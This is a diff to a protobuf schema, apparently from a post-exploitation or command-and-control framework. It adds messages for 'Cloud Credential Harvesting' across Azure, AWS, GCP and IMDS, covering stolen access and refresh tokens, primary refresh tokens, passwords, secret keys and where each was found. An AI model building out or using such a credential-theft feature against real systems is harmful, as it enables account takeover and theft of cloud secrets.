@@ -428,3 +428,40 @@ message PrivescResult {
   string new_integrity = 3;
   uint32 new_pid       = 4;
 }
+
+// --- Cloud Credential Harvesting ---
+
+message CloudHarvestConfig {
+  string provider    = 1;  // "azure", "aws", "gcp", "imds", "all"
+  string method      = 2;  // "cli", "imds", "managed_identity", "adconnect", "entra_token", "creds", "all"
+}
+
+message CloudHarvestResult {
+  string               provider    = 1;
+  string               method      = 2;
+  repeated CloudToken  tokens      = 3;
+  repeated CloudCredential credentials = 4;
+  string               metadata    = 5;  // JSON metadata from IMDS
+  string               error       = 6;
+}
+
+message CloudToken {
+  string provider      = 1;
+  string token_type    = 2;  // "access_token", "refresh_token", "prt", "managed_identity"
+  string access_token  = 3;
+  string refresh_token = 4;
+  string tenant_id     = 5;
+  string client_id     = 6;
+  string resource      = 7;
+  int64  expires_at    = 8;
+  string source        = 9;  // where the token was found
+}
+
+message CloudCredential {
+  string provider    = 1;  // "azure", "aws", "gcp"
+  string cred_type   = 2;  // "access_key", "service_account", "password", "connection_string"
+  string identity    = 3;  // username, access_key_id, service account email
+  string secret      = 4;  // password, secret key, private key
+  string extra       = 5;  // session token, project id, etc.
+  string source      = 6;  // file path or env var where found
+}
